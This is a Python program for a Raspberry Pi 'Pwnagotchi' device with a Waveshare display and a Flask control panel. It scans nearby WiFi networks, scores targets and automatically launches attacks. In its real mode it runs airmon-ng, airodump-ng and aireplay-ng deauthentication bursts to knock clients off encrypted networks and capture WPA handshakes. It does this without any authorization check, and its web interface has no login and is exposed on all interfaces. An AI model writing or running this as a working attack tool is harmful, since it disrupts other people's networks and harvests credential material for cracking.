#!/usr/bin/env python3
"""
Complete AI Pwnagotchi v3.0
- AI Learning and Target Selection
- Real WiFi Attacks (when monitor mode available)
- Waveshare v4 Display Support
- Web Interface with Attack Controls
- Simulation Mode Fallback
"""

import os
import sys
import time
import json
import random
import logging
import threading
import subprocess
from datetime import datetime, timedelta
from collections import defaultdict
from flask import Flask, render_template_string, jsonify, request

# Display support
try:
    from waveshare_epd import epd2in13_V4
    from PIL import Image, ImageDraw, ImageFont
    import RPi.GPIO as GPIO
    DISPLAY_AVAILABLE = True
except ImportError:
    DISPLAY_AVAILABLE = False
    print("Display libraries not available - running headless")

class PwnagotchiAI:
    """AI Brain for intelligent target selection and attack optimization"""
    
    def __init__(self):
        self.network_history = defaultdict(list)
        self.success_patterns = defaultdict(int)
        self.learning_rate = 0.1
        self.exploration_rate = 0.3
        
    def evaluate_target(self, network):
        """AI evaluation of target network"""
        score = 0
        
        # Signal strength factor
        if network['signal'] > -50:
            score += 30
        elif network['signal'] > -70:
            score += 20
        else:
            score += 10
            
        # Encryption factor
        if network['encryption'] != 'Open':
            score += 25
            
        # Historical success rate
        mac = network['mac']
        if mac in self.network_history:
            history = self.network_history[mac]
            if history:
                success_rate = sum(1 for h in history if h['success']) / len(history)
                score += int(success_rate * 40)
                
        # Channel diversity
        channel_penalty = self.success_patterns.get(f"channel_{network['channel']}", 0)
        score -= min(channel_penalty * 2, 15)
        
        # Time-based learning
        current_hour = datetime.now().hour
        time_bonus = self.success_patterns.get(f"hour_{current_hour}", 0)
        score += min(time_bonus * 3, 20)
        
        return max(score, 1)
    
    def select_target(self, networks):
        """AI-powered target selection"""
        if not networks:
            return None
            
        candidates = [net for net in networks.values() 
                     if net['encryption'] != 'Open' and net['signal'] > -85]
        
        if not candidates:
            return None
            
        if random.random() < self.exploration_rate:
            return random.choice(candidates)
        else:
            scored_targets = [(self.evaluate_target(net), net) for net in candidates]
            scored_targets.sort(reverse=True, key=lambda x: x[0])
            return scored_targets[0][1]
    
    def learn_from_attack(self, network, success, handshake_captured):
        """Learn from attack results"""
        mac = network['mac']
        
        result = {
            'timestamp': datetime.now(),
            'success': success,
            'handshake': handshake_captured,
            'signal': network['signal'],
            'channel': network['channel'],
            'hour': datetime.now().hour
        }
        
        self.network_history[mac].append(result)
        
        if success:
            self.success_patterns[f"channel_{network['channel']}"] += 1
            self.success_patterns[f"hour_{datetime.now().hour}"] += 1
        
        # Keep recent history only
        if len(self.network_history[mac]) > 50:
            self.network_history[mac] = self.network_history[mac][-50:]
    
    def get_ai_stats(self):
        """Get AI learning statistics"""
        total_attacks = sum(len(history) for history in self.network_history.values())
        total_success = sum(sum(1 for h in history if h['success']) 
                           for history in self.network_history.values())
        
        return {
            'total_attacks': total_attacks,
            'success_rate': (total_success / total_attacks * 100) if total_attacks > 0 else 0,
            'networks_learned': len(self.network_history),
            'best_channel': max(self.success_patterns.items(), key=lambda x: x[1])[0] if self.success_patterns else "None",
            'exploration_rate': self.exploration_rate * 100
        }

class CompletePwnagotchi:
    def __init__(self):
        self.name = "CompletePwn"
        self.version = "3.0.0"
        self.mood = "learning"
        self.epoch = 0
        self.networks = {}
        self.handshakes = []
        self.attacks = []
        self.running = True
        self.monitor_interface = None
        self.real_attacks_enabled = False
        
        # Initialize AI
        self.ai = PwnagotchiAI()
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler('/var/log/pwnagotchi.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Check for monitor mode capability
        self.check_monitor_mode()
        
        if DISPLAY_AVAILABLE:
            self.init_display()
        
        self.init_web_server()
        
    def check_monitor_mode(self):
        """Check if monitor mode is available"""
        try:
            # Check for external WiFi adapter
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            if 'wlan1' in result.stdout:
                # Try to enable monitor mode on wlan1 (external adapter)
                try:
                    subprocess.run(['/usr/sbin/airmon-ng', 'start', 'wlan1'], 
                                 capture_output=True, check=True)
                    self.monitor_interface = 'wlan1mon'
                    self.real_attacks_enabled = True
                    self.logger.info("🔥 REAL ATTACK MODE: Monitor mode enabled on wlan1")
                except:
                    self.logger.info("📡 External adapter found but monitor mode failed")
            else:
                self.logger.info("🎭 SIMULATION MODE: No external WiFi adapter detected")
                
        except Exception as e:
            self.logger.error(f"Monitor mode check failed: {e}")
    
    def init_display(self):
        """Initialize Waveshare v4 display"""
        try:
            GPIO.setwarnings(False)
            self.epd = epd2in13_V4.EPD()
            self.epd.init()
            self.epd.Clear(0xFF)
            
            self.width = self.epd.height
            self.height = self.epd.width
            self.image = Image.new('1', (self.width, self.height), 255)
            self.draw = ImageDraw.Draw(self.image)
            
            try:
                self.font_large = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf', 16)
                self.font_medium = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 12)
                self.font_small = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 10)
            except:
                self.font_large = ImageFont.load_default()
                self.font_medium = ImageFont.load_default()
                self.font_small = ImageFont.load_default()
            
            self.display_startup_message()
            self.logger.info("📺 Waveshare v4 display initialized")
            
        except Exception as e:
            self.logger.error(f"Display init failed: {e}")
    
    def display_startup_message(self):
        """Show startup message"""
        if not DISPLAY_AVAILABLE:
            return
            
        try:
            self.draw.rectangle((0, 0, self.width, self.height), fill=255)
            mode = "REAL ATTACKS" if self.real_attacks_enabled else "SIMULATION"
            self.draw.text((10, 10), "CompletePwn v3", font=self.font_large, fill=0)
            self.draw.text((10, 35), f"Mode: {mode}", font=self.font_medium, fill=0)
            self.draw.text((10, 55), "(◕‿‿◕)", font=self.font_large, fill=0)
            self.draw.text((10, 85), "AI Learning!", font=self.font_small, fill=0)
            self.epd.display(self.epd.getbuffer(self.image))
            
        except Exception as e:
            self.logger.error(f"Display startup failed: {e}")
    
    def update_display(self):
        """Update display with current status"""
        if not DISPLAY_AVAILABLE:
            return
            
        try:
            self.draw.rectangle((0, 0, self.width, self.height), fill=255)
            
            faces = {
                'learning': '(◕‿‿◕)',
                'thinking': '(◔_◔)',
                'hunting': '(⌐■_■)',
                'attacking': '(◣_◢)',
                'excited': '(ᵔ◡◡ᵔ)',
                'smart': '(✜‿‿✜)'
            }
            face = faces.get(self.mood, '(◕‿‿◕)')
            
            self.draw.text((10, 5), f"{self.name}", font=self.font_medium, fill=0)
            self.draw.text((10, 25), face, font=self.font_large, fill=0)
            
            # Status info
            ai_stats = self.ai.get_ai_stats()
            self.draw.text((10, 50), f"Epoch: {self.epoch}", font=self.font_small, fill=0)
            self.draw.text((10, 65), f"Success: {ai_stats['success_rate']:.1f}%", font=self.font_small, fill=0)
            self.draw.text((10, 80), f"Networks: {len(self.networks)}", font=self.font_small, fill=0)
            self.draw.text((10, 95), f"Handshakes: {len(self.handshakes)}", font=self.font_small, fill=0)
            
            # Mode indicator
            mode = "REAL" if self.real_attacks_enabled else "SIM"
            self.draw.text((180, 5), mode, font=self.font_small, fill=0)
            
            self.epd.display(self.epd.getbuffer(self.image))
            
        except Exception as e:
            self.logger.error(f"Display update failed: {e}")
    
    def scan_networks(self):
        """Scan for WiFi networks"""
        try:
            result = subprocess.run(['/sbin/iwlist', 'wlan0', 'scan'], 
                                  capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.parse_iwlist_output(result.stdout)
                
        except Exception as e:
            self.logger.error(f"Network scan failed: {e}")
    
    def parse_iwlist_output(self, output):
        """Parse iwlist scan output"""
        current_network = None
        
        for line in output.split('\n'):
            line = line.strip()
            
            if 'Cell' in line and 'Address:' in line:
                if current_network and current_network.get('ssid'):
                    self.networks[current_network['mac']] = current_network
                
                mac = line.split('Address: ')[1].strip()
                current_network = {
                    'mac': mac,
                    'ssid': '',
                    'channel': 0,
                    'signal': -100,
                    'encryption': 'Open',
                    'last_seen': datetime.now().isoformat()
                }
                
            elif current_network and 'ESSID:' in line:
                ssid = line.split('ESSID:')[1].strip().strip('"')
                if ssid:
                    current_network['ssid'] = ssid
                    
            elif current_network and 'Channel:' in line:
                try:
                    current_network['channel'] = int(line.split('Channel:')[1].strip())
                except:
                    pass
                    
            elif current_network and 'Signal level=' in line:
                try:
                    signal = int(line.split('Signal level=')[1].split(' ')[0])
                    current_network['signal'] = signal
                except:
                    pass
                    
            elif current_network and 'Encryption key:' in line:
                current_network['encryption'] = 'Open' if 'off' in line.lower() else 'WPA/WPA2'
        
        if current_network and current_network.get('ssid'):
            self.networks[current_network['mac']] = current_network
    
    def launch_real_attack(self, network):
        """Launch real deauthentication attack"""
        try:
            if not self.monitor_interface:
                return False
                
            # Start capture
            capture_file = f"/tmp/handshakes/{network['mac']}.cap"
            capture_cmd = [
                '/usr/sbin/airodump-ng',
                '-c', str(network['channel']),
                '--bssid', network['mac'],
                '-w', capture_file.replace('.cap', ''),
                self.monitor_interface
            ]
            
            capture_proc = subprocess.Popen(capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait a moment for capture to start
            time.sleep(2)
            
            # Launch deauth attack
            deauth_cmd = [
                '/usr/sbin/aireplay-ng',
                '--deauth', '10',
                '-a', network['mac'],
                self.monitor_interface
            ]
            
            subprocess.run(deauth_cmd, timeout=15, capture_output=True)
            
            # Stop capture
            capture_proc.terminate()
            time.sleep(1)
            
            # Check if handshake was captured
            if os.path.exists(f"{capture_file.replace('.cap', '')}-01.cap"):
                return True
                
        except Exception as e:
            self.logger.error(f"Real attack failed: {e}")
            
        return False
    
    def launch_attack(self, network, ai_controlled=False):
        """Launch attack (real or simulated)"""
        try:
            attack_type = "AI-Attack" if ai_controlled else "Manual"
            self.mood = 'attacking'
            
            attack = {
                'target': network['ssid'],
                'mac': network['mac'],
                'type': attack_type,
                'timestamp': datetime.now().isoformat(),
                'status': 'launched',
                'ai_controlled': ai_controlled,
                'ai_score': self.ai.evaluate_target(network) if ai_controlled else 0,
                'real_attack': self.real_attacks_enabled
            }
            
            self.attacks.append(attack)
            self.logger.info(f"🎯 {attack_type}: {network['ssid']} ({'REAL' if self.real_attacks_enabled else 'SIM'})")
            
            if ai_controlled:
                self.last_ai_target = network['ssid']
            
            # Launch attack
            if self.real_attacks_enabled:
                success = self.launch_real_attack(network)
            else:
                # Simulation mode
                time.sleep(2)
                success_rate = 0.4 if ai_controlled else 0.25
                success = random.random() < success_rate
            
            if success:
                handshake = {
                    'network': network['ssid'],
                    'mac': network['mac'],
                    'timestamp': datetime.now().isoformat(),
                    'ai_controlled': ai_controlled,
                    'real_capture': self.real_attacks_enabled,
                    'file': f"/tmp/handshakes/{network['mac']}.cap" if self.real_attacks_enabled else None
                }
                self.handshakes.append(handshake)
                attack['status'] = 'handshake_captured'
                self.mood = 'excited'
                self.logger.info(f"🏆 HANDSHAKE: {network['ssid']} ({'REAL' if self.real_attacks_enabled else 'SIM'})")
            else:
                attack['status'] = 'failed'
                self.mood = 'thinking' if ai_controlled else 'learning'
            
            # AI learns from result
            self.ai.learn_from_attack(network, success, success)
            
        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
    
    def ai_auto_attack(self):
        """AI-powered automatic attacks"""
        if len(self.networks) == 0:
            return
            
        target = self.ai.select_target(self.networks)
        
        if target and random.random() < 0.25:
            self.logger.info(f"🤖 AI Auto-targeting: {target['ssid']} (Score: {self.ai.evaluate_target(target)})")
            self.launch_attack(target, ai_controlled=True)
    
    def init_web_server(self):
        """Initialize web interface"""
        self.app = Flask(__name__)
        
        @self.app.route('/')
        def index():
            ai_stats = self.ai.get_ai_stats()
            return render_template_string("""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Complete Pwnagotchi v3.0</title>
                <style>
                    body { font-family: monospace; background: #001; color: #0ff; padding: 20px; }
                    .container { max-width: 1200px; margin: 0 auto; }
                    .face { font-size: 48px; text-align: center; margin: 20px 0; }
                    .stats { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
                    .stat-box { border: 1px solid #0ff; padding: 15px; }
                    .ai-box { border: 2px solid #ff0; background: #002; }
                    .real-mode { border: 2px solid #0f0; background: #020; }
                    .networks, .attacks { margin-top: 20px; }
                    .network, .attack { border-bottom: 1px solid #333; padding: 10px 0; }
                    .refresh { background: #0ff; color: #000; border: none; padding: 10px 20px; margin: 10px 0; cursor: pointer; }
                    .ai-attack { background: #ff0; color: #000; border: none; padding: 5px 10px; margin: 5px; cursor: pointer; }
                    .manual-attack { background: #f80; color: #000; border: none; padding: 5px 10px; margin: 5px; cursor: pointer; }
                    .real-indicator { color: #0f0; font-weight: bold; }
                    .sim-indicator { color: #ff0; font-weight: bold; }
                </style>
                <script>
                    function refreshData() {
                        fetch('/api/status').then(r => r.json()).then(data => {
                            document.getElementById('mood').textContent = data.face;
                            document.getElementById('epoch').textContent = data.epoch;
                            document.getElementById('networks').textContent = data.networks_count;
                            document.getElementById('attacks').textContent = data.attacks_count;
                            document.getElementById('handshakes').textContent = data.handshakes_count;
                            document.getElementById('ai_success').textContent = data.ai_stats.success_rate.toFixed(1) + '%';
                            document.getElementById('ai_learned').textContent = data.ai_stats.networks_learned;
                        });
                        
                        fetch('/api/networks').then(r => r.json()).then(networks => {
                            let html = '<h3>🎯 AI Target Analysis:</h3>';
                            networks.forEach(net => {
                                let security = net.encryption === 'Open' ? '🔓' : '🔒';
                                let aiScore = net.ai_score || 0;
                                let scoreColor = aiScore > 50 ? '#0f0' : aiScore > 30 ? '#ff0' : '#f80';
                                html += `<div class="network">
                                    ${security} <strong>${net.ssid}</strong> (${net.mac})<br>
                                    📶 Ch:${net.channel}, ${net.signal}dBm, ${net.encryption}<br>
                                    🤖 <span style="color:${scoreColor}">AI Score: ${aiScore}</span>
                                    <button class="ai-attack" onclick="aiAttack('${net.mac}', '${net.ssid}')">🤖 AI Attack</button>
                                    <button class="manual-attack" onclick="manualAttack('${net.mac}', '${net.ssid}')">⚡ Manual</button>
                                </div>`;
                            });
                            document.getElementById('networkList').innerHTML = html;
                        });
                    }
                    
                    function aiAttack(mac, ssid) {
                        fetch('/api/ai-attack', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({mac: mac, ssid: ssid})
                        }).then(r => r.json()).then(data => {
                            alert('🤖 AI Attack: ' + data.message);
                            refreshData();
                        });
                    }
                    
                    function manualAttack(mac, ssid) {
                        fetch('/api/attack', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({mac: mac, ssid: ssid})
                        }).then(r => r.json()).then(data => {
                            alert('⚡ Manual Attack: ' + ssid);
                            refreshData();
                        });
                    }
                    
                    setInterval(refreshData, 3000);
                    refreshData();
                </script>
            </head>
            <body>
                <div class="container">
                    <h1>🤖 Complete Pwnagotchi v{{ version }}</h1>
                    <div class="face" id="mood">{{ face }}</div>
                    
                    <div class="stats">
                        <div class="stat-box {{ 'real-mode' if real_attacks else '' }}">
                            <h3>📊 Status</h3>
                            <p>Name: {{ name }}</p>
                            <p>Epoch: <span id="epoch">{{ epoch }}</span></p>
                            <p>Mood: {{ mood }}</p>
                            <p>Mode: <span class="{{ 'real-indicator' if real_attacks else 'sim-indicator' }}">{{ 'REAL ATTACKS' if real_attacks else 'SIMULATION' }}</span></p>
                        </div>
                        <div class="stat-box ai-box">
                            <h3>🧠 AI Brain</h3>
                            <p>Success Rate: <span id="ai_success">{{ ai_stats.success_rate|round(1) }}%</span></p>
                            <p>Networks Learned: <span id="ai_learned">{{ ai_stats.networks_learned }}</span></p>
                            <p>Best Channel: {{ ai_stats.best_channel }}</p>
                        </div>
                        <div class="stat-box">
                            <h3>🏆 Results</h3>
                            <p>Networks: <span id="networks">{{ networks_count }}</span></p>
                            <p>Attacks: <span id="attacks">{{ attacks_count }}</span></p>
                            <p>Handshakes: <span id="handshakes">{{ handshakes_count }}</span></p>
                        </div>
                    </div>
                    
                    <div id="networkList" class="networks">Loading AI analysis...</div>
                </div>
            </body>
            </html>
            """, **self.get_status_data())
        
        @self.app.route('/api/status')
        def api_status():
            return jsonify(self.get_status_data())
        
        @self.app.route('/api/networks')
        def api_networks():
            networks_with_scores = []
            for network in self.networks.values():
                network_copy = network.copy()
                network_copy['ai_score'] = self.ai.evaluate_target(network)
                networks_with_scores.append(network_copy)
            return jsonify(networks_with_scores)
        
        @self.app.route('/api/ai-attack', methods=['POST'])
        def api_ai_attack():
            data = request.get_json()
            mac = data.get('mac')
            ssid = data.get('ssid')
            
            if mac in self.networks:
                network = self.networks[mac]
                ai_score = self.ai.evaluate_target(network)
                self.launch_attack(network, ai_controlled=True)
                return jsonify({
                    'status': 'ai_attack_launched', 
                    'target': ssid,
                    'ai_score': ai_score,
                    'message': f'AI selected {ssid} (Score: {ai_score})'
                })
            
            return jsonify({'status': 'error', 'message': 'Target not found'})
        
        @self.app.route('/api/attack', methods=['POST'])
        def api_attack():
            data = request.get_json()
            mac = data.get('mac')
            
            if mac in self.networks:
                network = self.networks[mac]
                self.launch_attack(network, ai_controlled=False)
                return jsonify({'status': 'manual_attack_launched', 'target': network['ssid']})
            
            return jsonify({'status': 'error', 'message': 'Target not found'})
    
    def get_status_data(self):
        """Get status with AI stats"""
        faces = {
            'learning': '(◕‿‿◕)',
            'thinking': '(◔_◔)',
            'hunting': '(⌐■_■)',
            'attacking': '(◣_◢)',
            'excited': '(ᵔ◡◡ᵔ)',
            'smart': '(✜‿‿✜)'
        }
        
        ai_stats = self.ai.get_ai_stats()
        
        return {
            'name': self.name,
            'version': self.version,
            'mood': self.mood,
            'face': faces.get(self.mood, '(◕‿‿◕)'),
            'epoch': self.epoch,
            'networks_count': len(self.networks),
            'attacks_count': len(self.attacks),
            'handshakes_count': len(self.handshakes),
            'ai_stats': ai_stats,
            'real_attacks': self.real_attacks_enabled
        }
    
    def main_loop(self):
        """Main operation loop"""
        mode = "REAL ATTACK" if self.real_attacks_enabled else "SIMULATION"
        self.logger.info(f"🤖 Complete Pwnagotchi v{self.version} - {mode} MODE")
        
        while self.running:
            try:
                self.epoch += 1
                
                # Scan networks
                self.scan_networks()
                
                # AI decision making
                self.ai_auto_attack()
                
                # Update display
                self.update_display()
                
                # Log progress
                if self.epoch % 5 == 0:
                    ai_stats = self.ai.get_ai_stats()
                    self.logger.info(f"Epoch {self.epoch}: {len(self.networks)} networks, "
                                   f"Success: {ai_stats['success_rate']:.1f}%, "
                                   f"Mode: {mode}")
                
                time.sleep(20)
                
            except KeyboardInterrupt:
                self.logger.info("Shutting down...")
                break
            except Exception as e:
                self.logger.error(f"Main loop error: {e}")
                time.sleep(5)
    
    def start_web_server(self):
        """Start web server"""
        def run_server():
            self.app.run(host='0.0.0.0', port=8080, debug=False)
        
        web_thread = threading.Thread(target=run_server, daemon=True)
        web_thread.start()
        mode = "REAL" if self.real_attacks_enabled else "SIM"
        self.logger.info(f"🌐 Web Interface ({mode}): http://0.0.0.0:8080")
    
    def run(self):
        """Start the complete pwnagotchi"""
        self.start_web_server()
        self.main_loop()

if __name__ == "__main__":
    pwnagotchi = CompletePwnagotchi()
    pwnagotchi.run()
